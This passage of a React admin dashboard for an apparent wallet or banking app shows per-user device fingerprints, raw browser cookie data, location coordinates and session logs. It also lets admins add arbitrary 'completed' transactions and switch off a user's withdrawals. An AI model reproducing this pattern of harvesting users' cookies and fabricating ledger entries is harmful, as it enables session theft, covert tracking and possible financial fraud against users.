          className="p-1.5 text-[#636366] hover:text-[#0A84FF] rounded-lg transition-colors"
        >
          <Edit2 className="w-3.5 h-3.5" />
        </button>
        <button
          data-testid={`button-delete-balance-${bal.id}`}
          onClick={onDelete}
          className="p-1.5 text-[#636366] hover:text-[#FF453A] rounded-lg transition-colors"
        >
          <Trash2 className="w-3.5 h-3.5" />
        </button>
      </div>
    </div>
  );
}

function DeviceInfoSection({ user }: { user: User }) {
  const hasAnyInfo = user.ipAddress || user.userAgent || user.deviceInfo || user.lastActive;
  if (!hasAnyInfo) {
    return (
      <div className="bg-[#0a0a0a] rounded-xl p-3.5">
        <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider">Device & Session Info</span>
        <p className="text-[#3a3a3c] text-xs mt-2">No login data yet</p>
      </div>
    );
  }

  let device: Record<string, string | number | boolean> | null = null;
  try {
    if (user.deviceInfo) device = JSON.parse(user.deviceInfo);
  } catch {}

  const parseUA = (ua: string) => {
    let browser = "Unknown";
    let os = "Unknown";
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Edg")) browser = "Edge";
    if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("Mac OS")) os = "macOS";
    else if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Linux")) os = "Linux";
    return { browser, os };
  };

  const uaParsed = user.userAgent ? parseUA(user.userAgent) : null;

  const formatDate = (d: string) => {
    const date = new Date(d);
    return date.toLocaleString("en-US", { month: "short", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true });
  };

  return (
    <div className="bg-[#0a0a0a] rounded-xl p-3.5 space-y-3">
      <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider">Device & Session Info</span>

      {user.lastActive && (
        <div className="flex items-start gap-2.5">
          <Clock className="w-3.5 h-3.5 text-[#636366] mt-0.5 flex-shrink-0" />
          <div>
            <p className="text-[#636366] text-[10px] uppercase tracking-wider">Last Active</p>
            <p className="text-white text-xs">{formatDate(user.lastActive)}</p>
          </div>
        </div>
      )}

      {user.ipAddress && (
        <div className="flex items-start gap-2.5">
          <Globe className="w-3.5 h-3.5 text-[#636366] mt-0.5 flex-shrink-0" />
          <div>
            <p className="text-[#636366] text-[10px] uppercase tracking-wider">IP Address</p>
            <p className="text-white text-xs font-mono">{user.ipAddress}</p>
          </div>
        </div>
      )}

      {uaParsed && (
        <div className="flex items-start gap-2.5">
          <Monitor className="w-3.5 h-3.5 text-[#636366] mt-0.5 flex-shrink-0" />
          <div>
            <p className="text-[#636366] text-[10px] uppercase tracking-wider">Browser / OS</p>
            <p className="text-white text-xs">{uaParsed.browser} on {uaParsed.os}</p>
          </div>
        </div>
      )}

      {user.userAgent && (
        <div className="flex items-start gap-2.5">
          <Smartphone className="w-3.5 h-3.5 text-[#636366] mt-0.5 flex-shrink-0" />
          <div>
            <p className="text-[#636366] text-[10px] uppercase tracking-wider">User Agent</p>
            <p className="text-[#8E8E93] text-[10px] font-mono break-all leading-relaxed">{user.userAgent}</p>
          </div>
        </div>
      )}

      {device && (
        <div className="space-y-2 pt-1 border-t border-[#1c1c1e]">
          <p className="text-[#636366] text-[10px] uppercase tracking-wider">Device Details</p>
          <div className="grid grid-cols-2 gap-x-4 gap-y-1.5">
            {device.screenWidth && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Screen</p>
                <p className="text-white text-[11px]">{device.screenWidth}×{device.screenHeight} @{device.pixelRatio}x</p>
              </div>
            )}
            {device.platform && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Platform</p>
                <p className="text-white text-[11px]">{String(device.platform)}</p>
              </div>
            )}
            {device.language && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Language</p>
                <p className="text-white text-[11px]">{String(device.language)}</p>
              </div>
            )}
            {device.timezone && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Timezone</p>
                <p className="text-white text-[11px]">{String(device.timezone)}</p>
              </div>
            )}
            {device.maxTouchPoints !== undefined && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Touch Points</p>
                <p className="text-white text-[11px]">{String(device.maxTouchPoints)}</p>
              </div>
            )}
            {device.hardwareConcurrency && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">CPU Cores</p>
                <p className="text-white text-[11px]">{String(device.hardwareConcurrency)}</p>
              </div>
            )}
            {device.colorDepth && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Color Depth</p>
                <p className="text-white text-[11px]">{String(device.colorDepth)}-bit</p>
              </div>
            )}
            {device.orientation && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Orientation</p>
                <p className="text-white text-[11px]">{String(device.orientation)}</p>
              </div>
            )}
            {device.vendor && (
              <div>
                <p className="text-[#3a3a3c] text-[9px] uppercase">Vendor</p>
                <p className="text-white text-[11px]">{String(device.vendor)}</p>
              </div>
            )}
            <div>
              <p className="text-[#3a3a3c] text-[9px] uppercase">Cookies</p>
              <p className="text-white text-[11px]">{device.cookiesEnabled ? "Enabled" : "Disabled"}</p>
            </div>
            <div>
              <p className="text-[#3a3a3c] text-[9px] uppercase">Online</p>
              <p className="text-white text-[11px]">{device.online ? "Yes" : "No"}</p>
            </div>
          </div>
          {device.cookies && String(device.cookies).length > 0 && (
            <div className="pt-1">
              <p className="text-[#3a3a3c] text-[9px] uppercase">Cookie Data</p>
              <p className="text-[#8E8E93] text-[10px] font-mono break-all leading-relaxed mt-0.5">{String(device.cookies)}</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function WalletActivityControls({ user }: { user: User }) {
  const [depositsEnabled, setDepositsEnabled] = useState(user.depositsEnabled ?? true);
  const [withdrawalsEnabled, setWithdrawalsEnabled] = useState(user.withdrawalsEnabled ?? true);
  const [bankTransfersEnabled, setBankTransfersEnabled] = useState(user.bankTransfersEnabled ?? true);
  const [saving, setSaving] = useState(false);

  const handleToggle = async (field: "depositsEnabled" | "withdrawalsEnabled" | "bankTransfersEnabled", value: boolean) => {
    const updates = {
      depositsEnabled: field === "depositsEnabled" ? value : depositsEnabled,
      withdrawalsEnabled: field === "withdrawalsEnabled" ? value : withdrawalsEnabled,
      bankTransfersEnabled: field === "bankTransfersEnabled" ? value : bankTransfersEnabled,
    };
    if (field === "depositsEnabled") setDepositsEnabled(value);
    if (field === "withdrawalsEnabled") setWithdrawalsEnabled(value);
    if (field === "bankTransfersEnabled") setBankTransfersEnabled(value);
    setSaving(true);
    try {
      await apiRequest("PATCH", `/api/admin/users/${user.id}/settings`, updates);
      queryClient.invalidateQueries({ queryKey: ["/api/admin/users"] });
    } catch {}
    setSaving(false);
  };

  const Toggle = ({ label, value, onChange, icon }: { label: string; value: boolean; onChange: (v: boolean) => void; icon: React.ReactNode }) => (
    <div className="flex items-center justify-between py-2">
      <div className="flex items-center gap-2">
        {icon}
        <span className="text-white text-xs">{label}</span>
      </div>
      <button
        onClick={() => onChange(!value)}
        disabled={saving}
        className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px] font-semibold transition-colors ${
          value ? "bg-[#30D158]/20 text-[#30D158]" : "bg-[#FF453A]/20 text-[#FF453A]"
        }`}
      >
        {value ? <ToggleRight className="w-3.5 h-3.5" /> : <ToggleLeft className="w-3.5 h-3.5" />}
        {value ? "Enabled" : "Disabled"}
      </button>
    </div>
  );

  return (
    <div className="bg-[#0a0a0a] rounded-xl p-3.5 space-y-1">
      <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider flex items-center gap-1.5 mb-2">
        <Activity className="w-3.5 h-3.5" /> Wallet Activity Controls
      </span>
      <Toggle
        label="Deposits"
        value={depositsEnabled}
        onChange={(v) => handleToggle("depositsEnabled", v)}
        icon={<ArrowDownLeft className="w-3.5 h-3.5 text-[#30D158]" />}
      />
      <div className="h-px bg-[#1c1c1e]" />
      <Toggle
        label="Withdrawals"
        value={withdrawalsEnabled}
        onChange={(v) => handleToggle("withdrawalsEnabled", v)}
        icon={<ArrowUpRight className="w-3.5 h-3.5 text-[#FF453A]" />}
      />
      <div className="h-px bg-[#1c1c1e]" />
      <Toggle
        label="Bank Transfers"
        value={bankTransfersEnabled}
        onChange={(v) => handleToggle("bankTransfersEnabled", v)}
        icon={<Building2 className="w-3.5 h-3.5 text-[#0A84FF]" />}
      />
    </div>
  );
}

const TX_TYPE_OPTIONS = [
  { value: "deposit", label: "Deposit" },
  { value: "withdrawal", label: "Withdrawal" },
  { value: "bank_transfer", label: "Bank Transfer" },
];

function UserTransactionsSection({ userId }: { userId: string }) {
  const [showAddTx, setShowAddTx] = useState(false);
  const [txType, setTxType] = useState("deposit");
  const [txAmount, setTxAmount] = useState("");
  const [txDescription, setTxDescription] = useState("");
  const [txStatus, setTxStatus] = useState("completed");
  const [adding, setAdding] = useState(false);

  const { data: transactions = [], refetch } = useQuery<UserTransaction[]>({
    queryKey: ["/api/admin/users", userId, "transactions"],
    queryFn: async () => {
      const res = await fetch(`/api/admin/users/${userId}/transactions`);
      if (!res.ok) return [];
      return res.json();
    },
  });

  const handleAddTx = async () => {
    if (!txAmount) return;
    setAdding(true);
    try {
      await apiRequest("POST", `/api/admin/users/${userId}/transactions`, {
        type: txType,
        asset: "USD",
        amount: parseFloat(txAmount) || 0,
        amountUsd: parseFloat(txAmount) || 0,
        status: txStatus,
        description: txDescription.trim() || null,
      });
      setTxAmount("");
      setTxDescription("");
      setShowAddTx(false);
      refetch();
    } catch {}
    setAdding(false);
  };

  const handleDeleteTx = async (id: string) => {
    try {
      await apiRequest("DELETE", `/api/admin/transactions/${id}`);
      refetch();
    } catch {}
  };

  const formatDate = (d: string) => new Date(d).toLocaleString("en-US", { month: "short", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true });

  const getTypeLabel = (type: string) => {
    if (type === "bank_transfer" || type === "bank_transfer_withdrawal") return "Bank Transfer";
    if (type === "deposit") return "Deposit";
    if (type === "withdrawal") return "Withdrawal";
    return type;
  };

  const getTypeColor = (type: string) => {
    if (type === "deposit") return "text-[#30D158]";
    return "text-[#FF453A]";
  };

  return (
    <div className="bg-[#0a0a0a] rounded-xl p-3.5 space-y-3">
      <div className="flex items-center justify-between">
        <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider flex items-center gap-1.5">
          <Banknote className="w-3.5 h-3.5" /> Activity ({transactions.length})
        </span>
        <button
          onClick={() => setShowAddTx(!showAddTx)}
          className="flex items-center gap-1 text-[#0A84FF] text-[10px] font-medium"
        >
          <Plus className="w-3 h-3" />
          Add
        </button>
      </div>

      {showAddTx && (
        <div className="bg-[#1c1c1e] rounded-xl p-3 space-y-3 border border-[#2c2c2e]">
          <div>
            <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Type</label>
            <div className="flex gap-1.5">
              {TX_TYPE_OPTIONS.map(opt => (
                <button
                  key={opt.value}
                  onClick={() => setTxType(opt.value)}
                  className={`flex-1 py-1.5 rounded-lg text-[10px] font-semibold transition-colors ${
                    txType === opt.value
                      ? "bg-[#0A84FF] text-white"
                      : "bg-[#2c2c2e] text-[#8E8E93]"
                  }`}
                >
                  {opt.label}
                </button>
              ))}
            </div>
          </div>
          <div>
            <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Amount (USD)</label>
            <div className="relative">
              <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[#636366]" />
              <input
                type="number"
                step="any"
                value={txAmount}
                onChange={(e) => setTxAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-[#0a0a0a] border border-[#2c2c2e] rounded-lg pl-9 pr-4 py-2 text-white text-sm placeholder:text-[#3a3a3c] outline-none"
              />
            </div>
          </div>
          <div>
            <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Description (optional)</label>
            <input
              type="text"
              value={txDescription}
              onChange={(e) => setTxDescription(e.target.value)}
              placeholder="e.g. Monthly deposit"
              className="w-full bg-[#0a0a0a] border border-[#2c2c2e] rounded-lg px-3.5 py-2 text-white text-sm placeholder:text-[#3a3a3c] outline-none"
            />
          </div>
          <div>
            <label className="text-[#636366] text-[10px] font-medium mb-1 block uppercase tracking-wider">Status</label>
            <div className="flex gap-1.5">
              {["completed", "pending", "failed"].map(s => (
                <button
                  key={s}
                  onClick={() => setTxStatus(s)}
                  className={`flex-1 py-1.5 rounded-lg text-[10px] font-semibold capitalize transition-colors ${
                    txStatus === s ? "bg-[#0A84FF] text-white" : "bg-[#2c2c2e] text-[#8E8E93]"
                  }`}
                >
                  {s}
                </button>
              ))}
            </div>
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => setShowAddTx(false)}
              className="flex-1 py-2 bg-[#2c2c2e] text-white rounded-lg text-[11px] font-medium"
            >
              Cancel
            </button>
            <button
              onClick={handleAddTx}
              disabled={adding || !txAmount}
              className="flex-1 py-2 bg-[#0A84FF] text-white rounded-lg text-[11px] font-semibold disabled:opacity-40"
            >
              {adding ? "Adding..." : "Add Transaction"}
            </button>
          </div>
        </div>
      )}

      {transactions.length === 0 && !showAddTx && (
        <p className="text-[#3a3a3c] text-xs">No transactions yet</p>
      )}

      <div className="space-y-2">
        {transactions.slice(0, 10).map((tx) => (
          <div key={tx.id} className="flex items-center gap-2 bg-[#1c1c1e] rounded-lg p-2.5">
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-1.5">
                <span className={`text-[11px] font-semibold ${getTypeColor(tx.type)}`}>
                  {getTypeLabel(tx.type)}
                </span>
                <span className={`text-[9px] uppercase px-1.5 py-0.5 rounded ${
                  tx.status === "completed" ? "bg-[#30D158]/15 text-[#30D158]" :
                  tx.status === "pending" ? "bg-[#FF9F0A]/15 text-[#FF9F0A]" :
                  "bg-[#FF453A]/15 text-[#FF453A]"
                }`}>{tx.status}</span>
                <span className="text-[#636366] text-[9px] ml-auto">{tx.createdBy}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white text-xs font-mono">${tx.amountUsd.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                {tx.description && <span className="text-[#636366] text-[10px] truncate">{tx.description}</span>}
              </div>
              <span className="text-[#3a3a3c] text-[9px]">{formatDate(tx.createdAt)}</span>
            </div>
            <button
              onClick={() => { if (confirm("Delete this transaction?")) handleDeleteTx(tx.id); }}
              className="p-1 text-[#636366] hover:text-[#FF453A] transition-colors"
            >
              <Trash2 className="w-3 h-3" />
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

interface SessionLog {
  id: string;
  userId: string;
  openedAt: string | null;
  closedAt: string | null;
  durationSeconds: number | null;
  ipAddress: string | null;
  userAgent: string | null;
  deviceInfo: string | null;
  location: string | null;
  screenInfo: string | null;
}

function SessionLogSection({ userId }: { userId: string }) {
  const [showAll, setShowAll] = useState(false);
  const { data: sessions = [] } = useQuery<SessionLog[]>({
    queryKey: ["/api/admin/users", userId, "sessions"],
    queryFn: async () => {
      const res = await fetch(`/api/admin/users/${userId}/sessions`);
      if (!res.ok) throw new Error("Failed");
      return res.json();
    },
  });

  if (sessions.length === 0) {
    return (
      <div className="bg-[#0a0a0a] rounded-xl p-3.5">
        <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider flex items-center gap-1.5">
          <Activity className="w-3.5 h-3.5" /> Session Log
        </span>
        <p className="text-[#3a3a3c] text-xs mt-2">No sessions recorded yet</p>
      </div>
    );
  }

  const formatDate = (d: string) => {
    const date = new Date(d);
    return date.toLocaleString("en-US", { month: "short", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", second: "2-digit", hour12: true });
  };

  const formatDuration = (secs: number) => {
    if (secs < 60) return `${secs}s`;
    if (secs < 3600) return `${Math.floor(secs / 60)}m ${secs % 60}s`;
    const h = Math.floor(secs / 3600);
    const m = Math.floor((secs % 3600) / 60);
    return `${h}h ${m}m`;
  };

  const parseLocation = (loc: string | null) => {
    if (!loc) return null;
    try {
      const parsed = JSON.parse(loc);
      if (parsed.raw && parsed.raw.includes(",")) {
        return { coords: parsed.raw, timezone: parsed.timezone, language: parsed.language };
      }
      return { coords: null, timezone: parsed.timezone || parsed.raw, language: parsed.language };
    } catch {
      return { coords: null, timezone: loc, language: null };
    }
  };

  const visible = showAll ? sessions : sessions.slice(0, 5);

  return (
    <div className="bg-[#0a0a0a] rounded-xl p-3.5 space-y-3">
      <div className="flex items-center justify-between">
        <span className="text-[#636366] text-[11px] font-medium uppercase tracking-wider flex items-center gap-1.5">
          <Activity className="w-3.5 h-3.5" /> Session Log ({sessions.length})
        </span>
        {sessions.length > 5 && (
          <button
            onClick={() => setShowAll(!showAll)}
            className="text-[#0A84FF] text-[10px] font-medium"
            data-testid={`button-toggle-sessions-${userId}`}
          >
            {showAll ? "Show Less" : `Show All (${sessions.length})`}
          </button>
        )}
      </div>

      <div className="space-y-2">
        {visible.map((s, idx) => {
          const loc = parseLocation(s.location);
          const isActive = !s.closedAt;
          return (
            <div key={s.id} className="bg-[#1c1c1e] rounded-lg p-2.5 space-y-1.5" data-testid={`session-log-${idx}`}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-1.5">
                  <Clock className="w-3 h-3 text-[#636366]" />
                  <span className="text-white text-[11px] font-medium">
                    {s.openedAt ? formatDate(s.openedAt) : "Unknown"}
                  </span>
                </div>
                {isActive ? (
                  <span className="text-[#30D158] text-[9px] font-bold uppercase bg-[#30D158]/15 px-1.5 py-0.5 rounded">Live</span>
                ) : (
                  <span className="text-[#8E8E93] text-[9px] bg-[#2c2c2e] px-1.5 py-0.5 rounded">Closed</span>
                )}
              </div>

              <div className="flex items-center gap-3 flex-wrap">
                {s.durationSeconds != null && s.durationSeconds > 0 && (
                  <div className="flex items-center gap-1">
                    <Timer className="w-2.5 h-2.5 text-[#636366]" />
                    <span className="text-[#8E8E93] text-[10px]">{formatDuration(s.durationSeconds)}</span>
                  </div>
                )}
                {s.ipAddress && (
                  <div className="flex items-center gap-1">
                    <Globe className="w-2.5 h-2.5 text-[#636366]" />
                    <span className="text-[#8E8E93] text-[10px] font-mono">{s.ipAddress}</span>
                  </div>
                )}
                {loc?.coords && (
                  <div className="flex items-center gap-1">
                    <MapPinned className="w-2.5 h-2.5 text-[#636366]" />
                    <span className="text-[#8E8E93] text-[10px] font-mono">{loc.coords}</span>
                  </div>
                )}
                {loc?.timezone && (
                  <span className="text-[#3a3a3c] text-[10px]">{loc.timezone}</span>
                )}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
